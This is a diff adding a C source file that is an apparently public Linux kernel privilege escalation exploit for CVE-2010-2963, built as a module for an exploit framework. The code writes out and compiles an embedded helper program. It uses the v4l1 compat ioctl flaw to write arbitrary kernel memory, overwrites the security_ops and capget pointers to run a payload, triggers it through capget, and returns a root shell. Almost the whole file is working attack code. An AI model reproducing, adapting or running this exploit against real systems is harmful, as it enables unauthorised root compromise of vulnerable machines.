@@ -1,0 +1,211 @@
+//source: http://www.securityfocus.com/bid/44242/info
+/*
+ * CVE-2010-2963
+ * Arbitrary write memory write via v4l1 compat ioctl.
+ * Kees Cook <kees@ubuntu.com>
+ *
+ * greets to drosenberg, spender, taviso
+ */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include "exp_framework.h"
+
+#include <stdint.h>
+#include <string.h>
+#include <poll.h>
+#include <sys/ioctl.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <sys/types.h>
+#include <linux/videodev.h>
+#include <syscall.h>
+
+#include <sys/capability.h>
+struct cap_header_t {
+    uint32_t version;
+    int pid;
+};
+
+#define DEVICE "/dev/video0"
+
+struct exploit_state *exp_state;
+
+char *desc = "Vyakarana: Linux v4l1 compat ioctl arbitrary memory write";
+int requires_null_page = 0;
+
+int built = 0;
+
+int super_memcpy(unsigned long destination, void *source, int length)
+{
+    struct video_code vc = { };
+    struct video_tuner tuner = { };
+    int dev;
+    unsigned int code;
+    char cmd[80];
+
+    if (!built) {
+        FILE *source;
+        char *sourcecode = "/*\n\
+ * CVE-2010-2963: Write kernel memory via v4l compat ioctl.\n\
+ * Oct 11, 2010  Kees Cook <kees@ubuntu.com>\n\
+ *\n\
+ */\n\
+#define _GNU_SOURCE\n\
+#include <stdio.h>\n\
+#include <stdlib.h>\n\
+#include <stdint.h>\n\
+#include <unistd.h>\n\
+#include <sys/types.h>\n\
+#include <sys/stat.h>\n\
+#include <fcntl.h>\n\
+#include <string.h>\n\
+#include <sys/ioctl.h>\n\
+#include <sys/mman.h>\n\
+#include <assert.h>\n\
+#include <malloc.h>\n\
+#include <sys/types.h>\n\
+#include <linux/videodev.h>\n\
+#include <syscall.h>\n\
+\n\
+#define DEVICE \"/dev/video0\"\n\
+\n\
+struct video_code32 {\n\
+        char            loadwhat[16];\n\
+        int             datasize;\n\
+        int             padding;\n\
+        uint64_t        data;\n\
+};\n\
+\n\
+int super_memcpy(uint64_t destination, void *source, int length)\n\
+{\n\
+    struct video_code32 vc = { };\n\
+    struct video_tuner tuner = { };\n\
+    int dev;\n\
+    unsigned int code;\n\
+\n\
+    if ( (dev=open(DEVICE, O_RDWR)) < 0) {\n\
+        perror(DEVICE);\n\
+        return 1;\n\
+    }\n\
+\n\
+    vc.datasize = length;\n\
+    vc.data = (uint64_t)(uintptr_t)source;\n\
+\n\
+    memset(&tuner, 0xBB, sizeof(tuner));\n\
+\n\
+    // manual union, since a real union won't do ptrs for 64bit\n\
+    uint64_t *ptr = (uint64_t*)(&(tuner.name[20]));\n\
+    *ptr = destination;\n\
+\n\
+    // beat memory into the stack...\n\
+    code = VIDIOCSTUNER;\n\
+    syscall(54, dev, code, &tuner);\n\
+    syscall(54, dev, code, &tuner);\n\
+    syscall(54, dev, code, &tuner);\n\
+    syscall(54, dev, code, &tuner);\n\
+    syscall(54, dev, code, &tuner);\n\
+    syscall(54, dev, code, &tuner);\n\
+\n\
+    code = 0x4020761b; // VIDIOCSMICROCODE32 (why isn't this VIDIOCSMICROCODE?)\n\
+    syscall(54, dev, code, &vc);\n\
+\n\
+    return 0;\n\
+}\n\
+\n\
+int main(int argc, char *argv[])\n\
+{\n\
+    uint64_t destination = strtoull(argv[1], NULL, 16);\n\
+    uint64_t value = strtoull(argv[2], NULL, 16);\n\
+    int length = atoi(argv[3]);\n\
+    if (length > sizeof(value))\n\
+        length = sizeof(value);\n\
+    return super_memcpy(destination, &value, length);\n\
+}\n\
+";
+
+        if (!(source = fopen("vyakarana.c","w"))) {
+            fprintf(stderr, "cannot write source\n");
+            return 1;
+        }
+        fwrite(sourcecode, strlen(sourcecode), 1, source);
+        fclose(source);
+        if (system("gcc -Wall -m32 vyakarana.c -o vyakarana") != 0) {
+            fprintf(stderr, "cannot build source\n");
+            return 1;
+        }
+        built = 1;
+    }
+
+    printf("Writing to %p (len %d): ", (void*)destination, length);
+    for (dev=0; dev<length; dev++) {
+        printf("0x%02x ", *((unsigned char*)source+dev));
+    }
+    printf("\n");
+
+    sprintf(cmd, "./vyakarana %lx %lx 8", (uint64_t)(uintptr_t)destination, *(uint64_t*)source);
+    return system(cmd);
+}
+
+int get_exploit_state_ptr(struct exploit_state *ptr)
+{
+    exp_state = ptr;
+    return 0;
+}
+
+unsigned long default_sec;
+unsigned long target;
+unsigned long restore;
+
+int prepare(unsigned char *buf)
+{
+    unsigned long addr;
+
+    if (sizeof(long)!=8) {
+        printf("Not enough bits\n");
+        return 1;
+    }
+
+    printf("Reticulating splines...\n");
+
+    addr = exp_state->get_kernel_sym("security_ops");
+    default_sec = exp_state->get_kernel_sym("default_security_ops");
+    restore = exp_state->get_kernel_sym("cap_capget");
+
+    // reset security_ops
+    super_memcpy(addr, &default_sec, sizeof(void*));
+
+    // aim capget to enlightenment payload
+    target = default_sec + ((11 + sizeof(void*) -1) / sizeof(void*))*sizeof(void*) + (2 * sizeof(void*));
+    super_memcpy(target, &(exp_state->own_the_kernel), sizeof(void*));
+
+    return 0;
+}
+
+int trigger(void)
+{
+    struct cap_header_t hdr;
+    uint32_t data[3];
+
+    printf("Skipping school...\n");
+
+    hdr.version = _LINUX_CAPABILITY_VERSION_1;
+    hdr.pid = 1;
+    capget((cap_user_header_t)&hdr, (cap_user_data_t)data);
+
+    return 1;
+}
+
+int post(void)
+{
+    printf("Restoring grammar...\n");
+
+    // restore security op pointer
+    super_memcpy(target, &restore, sizeof(void*));
+
+    return RUN_ROOTSHELL;
+}
